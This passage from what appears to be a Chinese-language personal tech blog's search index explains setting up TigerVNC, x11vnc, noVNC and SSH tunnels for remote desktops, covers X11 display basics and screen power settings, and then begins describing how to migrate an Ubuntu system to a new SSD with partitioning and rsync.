tigervnc.conf(5x)</code>\u53ef\u4ee5\u77e5\u9053\uff0c\u4ee5\u4e0b\u56db\u7ea7\u914d\u7f6e\u4f9d\u6b21\u751f\u6548\uff0c\u540e\u8005\u8986\u76d6\u524d\u8005\uff1avncserver-config-defaults, $HOME/.vnc/tigervnc.conf, command-line option, vncserver-config-mandatory</p> <p>\u5177\u4f53\u914d\u7f6e\u53ef\u67e5\u770b<code>/etc/tigervnc/vncserver-config-defaults</code></p> <p>user assign</p> <pre><code>#/etc/tigervnc/vncserver.users\n</code></pre> <p>startup script</p> <ul> <li>\u76f8\u5f53\u4e8e\u8bf4\u9ed8\u8ba4\u6761\u4ef6\u4e0b\uff1a<code>$vncUserDir/Xtigervnc-session</code>\uff0c<code>$vncUserDir/xstartup</code>\uff0c<code>/etc/X11/Xtigervnc-session</code>\u91cd\u8981\u6027\u4f9d\u6b21\u964d\u4f4e\uff0c\u53ea\u6709\u524d\u8005\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u6267\u884c\u540e\u8005\u3002</li> </ul> <pre><code># $vncStartup points to a script that will be started at the very beginning\n# when neither $vncUserDir/Xtigervnc-session nor $vncUserDir/xstartup is present.\n# If $vncUserDir/Xtigervnc-session is present, it will be used. Otherwise, we try\n# $vncUserDir/xstartup. If this is also absent, then we use the script given by\n# $vncStartup. If $vncStartup is specified in $vncUserDir/tigervnc.conf, then this\n# script is used unconditionally. That is without checking for the presence of\n# $vncUserDir/Xtigervnc-session or $vncUserDir/xstartup.\n#\n# Default: $vncStartup = \"/etc/X11/Xtigervnc-session\";\n</code></pre> <p>session(\u684c\u9762\u73af\u5883)\uff0c\u5fc5\u987b\u8bbe\u7f6e</p> <ul> <li> <p>ubuntu22.04 \u5b89\u88c5\u4e86xfce4\u540e\u7684<code>/usr/share/xsessions</code></p> </li> <li> <p>ubuntu.desktop\uff1a\u4f7f\u7528wayland\u66ff\u4ee3X windows system</p> </li> <li> <p>ubuntu-xorg.desktop\uff1a\u4f7f\u7528X windows system</p> </li> <li>xfce.desktop</li> </ul> <pre><code># The $session option controls which X session type will be started. This\n# should match one of the files in /usr/share/xsessions. For example, if there\n# is a file called gnome.desktop, then $session = \"gnome\" would start this X\n# session. The command to start the session is passed to the $vncStartup\n# script. If this is not specified, then /etc/X11/Xtigervnc-session will start\n# the session specified by /usr/bin/x-session-manager.\n#\n# Default: $session = undef;\n</code></pre> <p>\u5176\u5b83</p> <pre><code>#\u663e\u793a\u5668\u51e0\u4f55\u5927\u5c0f\n# Default: $geometry = \"1920x1200\";\n\n#\u989c\u8272\n# $depth       sets the framebuffer color depth. Must be one of 16, 24, or 32.\n# $pixelformat sets the default pixelformat.\n#              A default can be derived if the tigervncserver is run in a\n#              X session -- either $ENV{DISPLAY} or the session given by\n#              $getDefaultFrom -- with the -xdisplaydefaults option. The depth\n#              and pixelformat can also be changed at the commandline with\n#              the -depth and -pixelformat options. Otherwise, the fixed\n#              defaults provided below for the two settings will be used.\n# Example: $depth = \"16\";\n#          $pixelformat = \"rgb565\";\n# Default: $depth = \"24\";\n# Default: $pixelformat = undef;\n\n#\u662f\u5426\u672c\u5730\u624d\u80fd\u8bbf\u95ee\n# Default: $localhost = \"yes\"; # if $SecurityTypes does not contain any TLS*\n#                              #    or X509* security types or the $SecurityTypes\n#                              #    does contain at least on *None security type.\n# Default: $localhost = \"no\";  # Otherwise\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<p>systemd\u7248\u672c</p> <pre><code>sudo systemctl start tigervncserver@:1  #\u6ce8\u610f\u662f:1\u4e0d\u662f1\n\nsudo systemctl enable tigervncserver@:1 #\u5f00\u673a\u81ea\u542f\u52a8\nsudo systemctl stop tigervncserver@:1   \n</code></pre> <p>\u57fa\u672c\u64cd\u4f5c</p> <p>(\u4f7f\u7528sudo\u770b\u5230\u7684\u662froot\u7528\u6237\u5f00\u542f\u7684\uff0c\u770b\u4e0d\u5230\u666e\u901a\u7528\u6237)</p> <pre><code>vncserver -list             #\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684server\u3002 \u5728tightvnc\u4e2d\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\uff0c\u9700\u8981\u901a\u8fc7\u67e5\u770b~/.vnc\u76ee\u5f55\u6765\u67e5\u770b\nvncserver -kill :number     #\u505c\u6b62\u6307\u5b9a\u7684server\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u96a7\u9053","title":"\u96a7\u9053","text":"<p>-localhost yes\u65f6\uff0c\u53ea\u80fd\u5728127.0.0.1\u4e0a\u8bbf\u95eevncserver\uff0c\u9700\u8981\u5229\u7528ssh\u5728\u5ba2\u6237\u7aef\u4e0a\u548c\u670d\u52a1\u5668\u4e0a\u5efa\u7acb\u4e00\u6761\u96a7\u9053\u3002</p> <pre><code>ssh -L 5901:localhost:5901 -C -N user@address -p PORT\nssh -L 5901:localhost:5901 -C -N rzyen  #\n</code></pre> <ul> <li>-L 5901:localhost:5901</li> </ul> <p>The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</p> <ul> <li> <p>-C: This argument speeds up processes and minimizes resource usage.</p> </li> <li> <p>-N: This argument prevents execution of remote commands and tells SSH to only forward ports</p> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u95ee\u9898_1","title":"\u95ee\u9898","text":"<ul> <li> <p>\u8fdc\u7a0b\u8bbf\u95ee\u754c\u9762\u548c\u672c\u5730\u6709\u4e9b\u4e0d\u4e00\u6837\u3002\u6bd4\u5982\u4fa7\u8fb9\u680f\u81ea\u52a8\u9690\u85cf\u4e86\uff0c\u53ea\u6709\u6309win\u952e\u624d\u4f1a\u51fa\u73b0\u3002</p> </li> <li> <p>systemd can't start on ubuntu 20.04 with error: No user configured for display 1 \u00b7 Issue #1168 \u00b7 TigerVNC/tigervnc (github.com)</p> <p>Gnome session doesn't load users' settings, it loads defaults. For instance, how dock should look  And how it is right now: </p> </li> <li> <p>\u4f7f\u7528wayland\u7248\u7684ubuntu DE\u4e0d\u4f1a\u9047\u5230</p> </li> <li> <p>\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff0c\u8fde\u63a5\u540e\u53ef\u4ee5\u770b\u5230\u4e00\u53cc\u773c\u775b</p> </li> </ul> <pre><code>tigervncserver -xstartup /usr/bin/xeyes\n</code></pre> <ul> <li>\u4e0d\u540c\u7684\u547d\u4ee4\u5230\u5e95\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f</li> </ul> <pre><code>tigervncconfig\ntigervncpasswd\ntigervncserver\ntigervncsession\nXtigervnc\n</code></pre> <ul> <li> <p>man Xvnc</p> <p>Xtigervnc is the X VNC (Virtual Network Computing) server.  It is based on a standard X server, but it has a \"virtual\" screen rather than a physical one.  X applications display themselves on it as if it were a normal X display, but they can only  be  accessed  via  a  VNC  viewer  -  see vncviewer(1).</p> <p>So  Xtigervnc  is really two servers in one. To the applications it is an X server, and to the remote VNC users it is a VNC server.</p> </li> <li> <p>man vncserver</p> <p>tigervncserver  is  used  to  start a TigerVNC (Virtual Network Computing) desktop. tigervncserver is a Perl wrapper script which simplifies the process of starting an instance of the TigerVNC server Xtigervnc. </p> <p>It runs Xtigervnc with appropriate options and starts some X  applications  to be displayed in the TigerVNC desktop.</p> </li> <li> <p>/etc/X11/Xsession</p> <p>global Xsession file -- used by display managers and xinit (startx)</p> <p>\u800cvncserver\u9ed8\u8ba4\u4f1a\u8c03\u7528\u8be5\u811a\u672c</p> </li> <li> <p>tigervnc1.12.0\u76f4\u63a5\u4f7f\u7528vncserver\u542f\u52a8\u62a5\u9519\uff08\u8fd9\u8bf4\u660e\u4e86\u5fc5\u987b\u4f7f\u7528systemd\u542f\u52a8\uff09</p> </li> </ul> <p>\u76f4\u63a5\u8fd0\u884c\u8be5\u547d\u4ee4\u4f1a\u62a5warnning\u4fe1\u606f</p> <pre><code>\u279c  ~ vncserver -localhost no\nvncserver: Warning: No X session desktop file or command for 0\n</code></pre> <p>\u6b64\u65f6vnc\u76f4\u63a5\u8fde\u63a5\uff0c\u53ea\u6709\u4e00\u4e2a\u9ed1\u767d\u7a97\u53e3\u663e\u793a<code>Xsession: unable to launch \"0\" X session --- \"0\" not found; falling back to default session</code></p> <ul> <li>\u65e2\u7136 X windows System\u672c\u8eab\u5c31\u652f\u6301\u7f51\u7edc\u663e\u793a\u3002\u4e3a\u4ec0\u4e48\u4e0d\u5728\u5ba2\u6237\u7aef\u4e0a\u8dd1\u4e00\u4e2aX server\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u7684X client\u4e0d\u4e45\u53ef\u4ee5\u8fdc\u7a0b\u663e\u793a\u5230\u5ba2\u6237\u7aef\u4e0a\u4e86\u5417\uff1f</li> </ul> <p>man Xvnc  (tigervnc 1.10)</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x11vnc","title":"x11vnc","text":"<ul> <li>X11vnc - ArchWiki (archlinux.org)</li> </ul> <p>x11vnc is a VNC server, it allows one to view remotely and interact with real X displays (i.e. a display corresponding to a physical monitor, keyboard, and mouse) with any VNC viewer. While it is not developed any longer by its original author Karl Runge, LibVNC and the GitHub community have taken over the development.</p> <p>x11vnc does not create an extra display (or X desktop) for remote control. Instead, it shows in real time the existing X11 display, unlike Xvnc, part of TigerVNC, which is an alternative VNC server available in the official repositories.</p> <p>Also note that x11vnc is not shipped with a client viewer. Any VNC viewer should do the job and be compatible with the x11vnc server while not necessarily using all its functionalities. TigerVNC's vncviewer is a recommended client.</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4e0d\u540c\u70b9","title":"\u4e0d\u540c\u70b9","text":"<ul> <li> <p>x11vnc\u548ctigervnc, tightvnc\u7684\u4e0d\u540c</p> </li> <li> <p>\u9700\u8981remote\u7aef\u5b9e\u9645\u63d2\u4e0a\u663e\u793a\u5668</p> </li> <li>local\u7aef(\u63a7\u5236\u7aef)\u7684\u753b\u9762\u548cremote\u663e\u793a\u5668\u663e\u793a\u76f8\u540c\u7684\u753b\u9762</li> </ul> <p>\u56e0\u6b64\u9002\u5408\u8fdc\u7a0b\u534f\u52a9\u573a\u666f</p> <ul> <li>\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u5361\u987f\u6709\u70b9\u5927\uff0c\u8fdc\u4e0d\u5982tigervnc\u6d41\u7545\uff0c\u5c5e\u4e8e\u52c9\u5f3a\u80fd\u7528\u6c34\u5e73\u3002</li> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u526a\u8d34\u677f\u4e0d\u8d77\u4f5c\u7528</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<pre><code>x11vnc -display :0\n</code></pre> <p>\u8fd0\u884c\u65f6\u4f1a\u8f93\u51fa\u4e00\u4e9bguideline\uff0c\u6309\u7167\u5176\u4e00\u6b65\u4e00\u6b65\u6765\u5373\u53ef</p> <ul> <li>running X server</li> </ul> <pre><code>An X server (the one you wish to view) must be running before x11vnc is\n   started: x11vnc does not start the X server.  (however, see the -create\n   option if that is what you really want).\n</code></pre> <ul> <li>\u6307\u5b9aX Display</li> </ul> <pre><code>** You must use -display &lt;disp&gt;, -OR- set and export your $DISPLAY\n   environment variable to refer to the display of the desired X server.\n - Usually the display is simply \":0\" (in fact x11vnc uses this if you forget\n   to specify it), but in some multi-user situations it could be \":1\", \":2\",\n   or even \":137\".  Ask your administrator or a guru if you are having\n   difficulty determining what your X DISPLAY is.\n</code></pre> <ul> <li>auth</li> </ul> <pre><code>** Next, you need to have sufficient permissions (Xauthority)\n   to connect to the X DISPLAY.   Here are some Tips:\n\n - Often, you just need to run x11vnc as the user logged into the X session.\n   So make sure to be that user when you type x11vnc.\n - Being root is usually not enough because the incorrect MIT-MAGIC-COOKIE\n   file may be accessed.  The cookie file contains the secret key that\n   allows x11vnc to connect to the desired X DISPLAY.\n - You can explicitly indicate which MIT-MAGIC-COOKIE file should be used\n   by the -auth option, e.g.:\n       x11vnc -auth /home/someuser/.Xauthority -display :0\n       x11vnc -auth /tmp/.gdmzndVlR -display :0\n   you must have read permission for the auth file.\n   See also '-auth guess' and '-findauth' discussed below.\n</code></pre> <p>\u65e0\u4eba\u767b\u5f55</p> <pre><code>If NO ONE is logged into an X session yet, but there is a greeter login\n   program like \"gdm\", \"kdm\", \"xdm\", or \"dtlogin\" running, you will need\n   to find and use the raw display manager MIT-MAGIC-COOKIE file.\n   Some examples for various display managers:\n\n     gdm:     -auth /var/gdm/:0.Xauth\n              -auth /var/lib/gdm/:0.Xauth\n     kdm:     -auth /var/lib/kdm/A:0-crWk72\n              -auth /var/run/xauth/A:0-crWk72\n     xdm:     -auth /var/lib/xdm/authdir/authfiles/A:0-XQvaJk\n     dtlogin: -auth /var/dt/A:0-UgaaXa\n   Sometimes the command \"ps wwwwaux | grep auth\" can reveal the file location.\n\n   Starting with x11vnc 0.9.9 you can have it try to guess by using:\n\n              -auth guess\n\n   (see also the x11vnc -findauth option.)\n\n   Only root will have read permission for the file, and so x11vnc must be run\n   as root (or copy it).  The random characters in the filenames will of course\n   change and the directory the cookie file resides in is system dependent.\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5ba2\u6237\u7aef","title":"\u5ba2\u6237\u7aef","text":"<p>realvnc\u5ba2\u6237\u7aef\uff0cwindows\u4e0b\u6709\u5355\u6587\u4ef6\u8fd0\u884c\u7248\u672c</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#novncweb\u5ba2\u6237\u7aef","title":"noVNC(web\u5ba2\u6237\u7aef)","text":"<p>VNC\u53ef\u4ee5\u5b9e\u73b0\u6d4f\u89c8\u5668\u7248\u672c\u7684\u5ba2\u6237\u7aef\u2014\u2014noVNC</p> <p>\u9700\u8981\u5728\u670d\u52a1\u7aef\u5b89\u88c5\u54cd\u5e94\u8f6f\u4ef6\u6765\u5b9e\u73b0websocket\u4ee3\u7406\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5176\u5b83remote-desktop","title":"\u5176\u5b83remote desktop","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#spice","title":"spice","text":"<p>Simple Protocol for Independent Computing Environments - Wikipedia</p> <ul> <li> <p>SPICE\u6700\u521d\u7528\u4f5c\u865a\u62df\u673a\u663e\u793a\uff0c\u6709\u7740\u4e0d\u9519\u7684\u6027\u80fd</p> </li> <li> <p>\u534a\u865a\u62df\u5316</p> </li> <li> <p>The QEMU binary links to the spice-server library to provide this capability and implements the QXL paravirtualized framebuffer device to enable the guest OS to take advantage of the performance benefits the SPICE protocol offers.</p> </li> <li> <p>virt-viewer\u9ed8\u8ba4</p> </li> <li> <p>\u73b0\u5728\u4e5f\u53ef\u4ee5\u7ed3\u5408xorg\u7528\u4e8eremote desktop connection (Xspice)</p> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x11\u539f\u7406","title":"X11\u539f\u7406","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u67e5\u770b\u6b63\u5728\u8fd0\u884c\u7684x-server","title":"\u67e5\u770b\u6b63\u5728\u8fd0\u884c\u7684X server","text":"<ul> <li>ssh - Is there a command to list all open displays on a machine? - Unix &amp; Linux Stack Exchange</li> </ul> <p>\u539f\u7406\u662f\u672c\u5730\u8fd0\u884c\u7684X server\u548cX client\u95f4\u7684\u901a\u4fe1\u662f\u901a\u8fc7\u5171\u4eab\u5185\u5b58\u65b9\u5f0f\u5b9e\u73b0\u7684</p> <pre><code>\u279c  ~ ls /tmp/.X11-unix\nX0\n</code></pre> <p>\u5f00\u542ftigervnc\u540e\u4f1a\u51fa\u73b0X1</p> <ul> <li>\u767b\u5f55\u4e86gdm\u540e\uff0cgdm\u542f\u52a8X server\u3002</li> </ul> <pre><code>ps aux |grep xorg\nyfy         4380  4.7  1.0 1064284 81108 tty2    Sl+  14:11   0:00 /usr/lib/xorg/Xorg vt2 -displayfd 3 -auth /run/user/1000/gdm/Xauthority -background none -noreset -keeptty -verbose 3\nyfy         4997  0.0  0.0  12132   716 pts/0    S+   14:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox xorg\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x-server-display","title":"X server, display","text":"<ul> <li>x11 - What are X server, display and screen? - Unix &amp; Linux Stack Exchange</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#boot-to-text-prompt","title":"boot to text prompt","text":"<pre><code>sudo systemctl set-default multi-user.target\n#sudo systemctl set-default graphical.target\n\nsudo reboot\n</code></pre> <ul> <li> <p>ctrl + alt + F2\u8fdb\u5165tty2\u3002\u7c7b\u4f3c\u7684(F1, F3, ...)</p> </li> <li> <p>\u5373\u4f7f\u662f\u5728text\u6a21\u5f0f\u4e0b\uff0c\u5f00\u542fdisplay manager\uff0c\u4f1a\u7acb\u9a6c\u8fdb\u5165GUI\u754c\u9762\uff0c\u767b\u5f55\u540e\u4e00\u5207\u6b63\u5e38\u3002</p> </li> </ul> <pre><code>sudo systemctl start gdm3\n</code></pre> <ul> <li>\u540c\u6837\u7684\uff0c\u5728GUI\u754c\u9762\uff0c\u5173\u95eddisplay manager\u540e\uff0cctrl-alt-F2\u8fdb\u5165text prompt</li> </ul> <pre><code>sudo systemctl stop gdm3\n</code></pre> <ul> <li>\u5728text\u6a21\u5f0f\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528tiger vnc</li> </ul> <p>\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\uff0c\u53ef\u4ee5\u770b\u4e0bsystemd\u8fc7\u7a0b</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55","title":"\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55","text":"<ul> <li> <p>Display Power Management Signaling - ArchWiki (archlinux.org)</p> </li> <li> <p>Standby\uff0c suspend\uff0c off\u662f\u4e0d\u540c\u7701\u7535\u7ea7\u522b\uff0c\u4f46\u662f\u662f\u9488\u5bf9CRT\u663e\u793a\u5668\u7684\uff0c\u5bf9\u4e8eLCD\u663e\u793a\u5668\u5747\u76f8\u540c\u3002</p> </li> </ul> <pre><code>Command   Description\nxset s off    Disable screen saver blanking\nxset s 3600 3600  Change blank time to 1 hour\nxset -dpms    Turn off DPMS\nxset s off -dpms  Disable DPMS and prevent screen from blanking\nxset dpms force off   Turn off screen immediately\nxset dpms force standby   Standby screen\nxset dpms force suspend   Suspend screen\n</code></pre> <ul> <li>\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55\uff0c\u53ea\u662f\u51fa\u4e8e\u7701\u7535\u3002\u5173\u95ed\u53f0\u5f0f\u673a\u663e\u793a\u5668\u7535\u6e90\u5e94\u89c6\u4e3a\u6ca1\u6709\u63d2\u5c4f\u5e55\u3002</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/","title":"linux\u7cfb\u7edf\u8fc1\u79fb","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#linux\u7cfb\u7edf\u8fc1\u79fb","title":"linux\u7cfb\u7edf\u8fc1\u79fb","text":"<p>\u4e70\u4e86\u4e00\u6761\u4e09\u661f\u7684PM9A1 SSD\uff0c\u60f3\u8981\u628a\u539f\u672c\u7684linux\u8fc1\u79fb\u5230\u65b0\u7684\u56fa\u6001\u4e0a\u3002</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u7cfb\u7edf\u4fe1\u606f","title":"\u7cfb\u7edf\u4fe1\u606f","text":"<ul> <li>\u539f\u672c\u7684\u7cfb\u7edf\uff08windows\u548cubuntu\u53cc\u7cfb\u7edf\uff09\u5b89\u88c5\u5728\u56fa\u6001\u4e0a\uff0c\u5305\u542bEFI\u5206\u533a\u3002</li> <li>\u7cfb\u7edf\u5f15\u5bfc\u65b9\u5f0f\uff1aEFI/GPT\uff08\u5176\u5b83\u65b9\u5f0f\u6709BIOS/MBR, BIOS/GPT\uff09 <p>BIOS system</p> <p>On a BIOS/GPT system there is no MBR and therefore no place to store the loader. The GPT partition specification allows for an unformatted partition of the BIOS boot partition type (0xEF02). The size of this partition can be as small as 1 mebibyte. The Calamares installer uses a fixed size of 32 mebibyte. On a BIOS/MBR system a part of the bootloader is written to the Master Boot Record for the primary disk.</p> </li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u683c\u5f0f\u5316\u78c1\u76d8","title":"\u683c\u5f0f\u5316\u78c1\u76d8","text":"<p>\u5728\u56fa\u6001\u4e0a\u521b\u5efa\u4e24\u4e2a\u5206\u533a</p> <ul> <li>EFI\u5206\u533a\uff0c100MB\uff0c\u683c\u5f0f\u5316\u4e3aFAT32</li> <li>gparted\u53ef\u4ee5\u8bbe\u7f6e\u5206\u533a\u540d\u79f0\u547d\u540d\u4e3aEFI</li> <li>\u8bbe\u7f6e\u6807\u5fd7\u4e3a\"boot esp\"</li> <li>\u7cfb\u7edf\u6839\u76ee\u5f55\u5206\u533a\uff0c\u5269\u4f59\u7a7a\u95f4\uff0c\u683c\u5f0f\u5316\u4e3aext4</li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u6302\u8f7d\u78c1\u76d8","title":"\u6302\u8f7d\u78c1\u76d8","text":"<pre><code>mkdir /mnt/ubuntu\nsudo mount /dev/nvme0np2 /mnt/ubuntu\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u5907\u4efd\u590d\u5236\u6587\u4ef6","title":"\u5907\u4efd/\u590d\u5236\u6587\u4ef6","text":"<p>\u53ef\u4ee5\u5c06\u7cfb\u7edf\u6839\u76ee\u5f55\uff08\u9700\u8981\u6392\u9664\u4e00\u4e9b\u76ee\u5f55\uff09\u6253\u5305\u538b\u7f29\u6210\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\uff0c\u7136\u540e\u89e3\u538b\u5230\u65b0\u56fa\u6001\u6839\u76ee\u5f55\u5206\u533a\u4e2d\u3002\u597d\u5904\u662f\u4ee5\u540e\u53ef\u4ee5\u518d\u6b21\u4ece\u5907\u4efd\u4e2d\u6062\u590d\u3002</p> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06\u7cfb\u7edf\u590d\u5236\u5230\u65b0\u7684\u56fa\u6001\u4e0a</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#tar","title":"tar","text":"<p>\u53c2\u8003https://rovo98.github.io/posts/3babee60/</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#rsync","title":"rsync","text":"<p>rsync\u7528\u4e8e\u5728\u4e24\u53f0\u673a\u5668\u95f4\u590d\u5236\u6587\u4ef6\uff0c\u4f1a\u6bd4\u8f83\u6e90\u76ee\u5f55\u548c\u76ee\u7684\u76ee\u5f55\u5185\u7684\u6587\u4ef6\uff0c\u907f\u514d\u590d\u5236\u91cd\u590d\u7684\u6587\u4ef6</p> <p>\u4e0d\u7528cp\u4e3b\u8981\u662fcp\u6392\u9664\u76ee\u5f55\u4e0d\u592a\u65b9\u4fbf\u3002\u5e76\u4e14\u4e07\u4e00\u51fa\u73b0\u95ee\u9898\u9700\u8981\u91cd\u65b0\u590d\u5236\uff0c\u9700\u8981\u91cd\u65b0\u590d\u5236\u8986\u76d6\u4e4b\u524d\u590d\u5236\u8fc7\u7684\u6587\u4ef6\u3002</p> <pre><code>rsync -aP --delete --exclude={\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\",\"/swapfile\",\"/home/yfy/D/*\",\"/home/yfy/Disk/*\"} / /mnt/ubuntu/ | tee /tmp/rsync_backup.log\n</code></pre> <pre><code> mount -o compress=zstd,subvol=/root /dev/nvme0n1p2 /mnt/ryzen\n mount -o compress=zstd,subvol=/home /dev/nvme0n1p2 /mnt/ryzen/home\n\nrsync -aP --delete --exclude={\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\",\"/swapfile\"} / /mnt/ryzen/ | tee /tmp/rsync_backup.log\n</code></pre> <p>\u9009\u9879\u8bf4\u660e</p> <ul> <li>-a\uff1a\u4fdd\u6301\u6587\u4ef6\u5c5e\u6027</li> <li>-P\uff1a\u663e\u793a\u8fdb\u5ea6\u6761</li> <li>--delete\uff1a\u5220\u9664\u76ee\u7684\u76ee\u5f55\u6bd4\u6e90\u76ee\u5f55\u591a\u51fa\u7684\u6587\u4ef6</li> <li>--exclude\uff1a\u6392\u9664\u6587\u4ef6\u5217\u8868\u3002\"/dev/*\"\u4e2d\u7684\"*\"\u7528\u4e8e\u5728\u76ee\u7684\u76ee\u5f55\u4e2d\u4fdd\u7559\u7a7a\u7684dev\u76ee\u5f55</li> <li>\u6392\u9664\u9879\u4e2d\u95f4<code>,</code>\u4e0d\u80fd\u63a5\u7a7a\u683c\uff0c\u5426\u5219\u683c\u5f0f\u9519\u8bef</li> <li>\u6392\u9664\u9879\u8868\u793a\u5339\u914d\u6a21\u5f0f\u3002rsync exclude directory not working - Unix &amp; Linux Stack Exchange<ul> <li>\u6839\u76ee\u5f55\u662ftransfer root\u4f5c\u4e3a\u6839\u76ee\u5f55</li> 